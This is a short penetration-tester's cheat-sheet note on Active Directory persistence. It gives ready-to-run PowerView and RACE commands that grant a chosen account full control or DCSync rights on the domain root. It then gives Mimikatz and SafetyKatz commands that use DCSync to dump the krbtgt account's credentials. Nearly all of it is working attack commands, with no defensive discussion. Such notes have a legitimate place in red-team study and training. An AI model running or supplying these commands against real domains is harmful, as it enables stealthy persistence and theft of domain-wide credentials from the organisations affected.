---
tags:
  - persistence
cssclasses: []
aliases:
---
This is a persistence mechanism, so it is assumed you have gained high privileges such as Domain Admin.
#### Add FullControl rights

```powershell title:"Add FullControl rights (PowerView)"
Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=name' -PrincipalIdentity username -Rights All -PrincipalDomain domain.name -TargetDomain domain.name -Verbose
```

```powershell title:"Add FullControl rights (ActiveDirectory Module and RACE)"
Set-ADACL -SamAccountName username -DistinguishedName 'DC=domain,DC=name' -Right GenericAll -Verbose
```
#### Add rights for DCSync

```powershell title:"Add rights for DCSync (PowerView)"
Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=name' -PrincipalIdentity username -Rights DCSync -PrincipalDomain domain.name -TargetDomain domain.name -Verbose
```

```powershell title:"Add rights for DCSync (ActiveDirectory module and RACE)"
Set-ADACL -SamAccountName username -DistinguishedName 'DC=domain,DC=name' -GUIDRight DCsync -Verbose
```

#### Execute DCSync

```powershell title:"Execute DCSync"
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
```
```batch
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:domain\krbtgt" "exit"
```

